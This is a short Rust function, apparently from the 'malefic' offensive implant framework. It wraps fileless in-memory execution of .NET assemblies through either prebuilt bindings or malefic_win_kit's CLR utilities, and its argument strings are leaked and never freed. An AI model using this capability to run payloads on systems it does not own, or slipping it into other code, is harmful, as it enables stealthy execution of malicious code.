pub unsafe fn exec_assemble_in_memory(data: &[u8], args: Vec<String>) -> String {
    #[cfg(feature = "prebuild")]
    {
        use super::bindings::MaleficExecAssembleInMemory;
        let c_strings: Vec<_> = args.iter()
                .map(|s| {
                    let c_str = std::ffi::CString::new(s.as_str()).unwrap();
                    c_str.into_raw()
                })
                .collect();
        let ret = MaleficExecAssembleInMemory(
            data.as_ptr(), data.len(),
            c_strings.as_ptr() as _, c_strings.len()
        );
        String::from_raw_parts(ret.data, ret.len, ret.capacity)
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::clr::CSharpUtils::ExecAssembleInMemory;
        match ExecAssembleInMemory(data, &args) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e
            }
        }
    }
}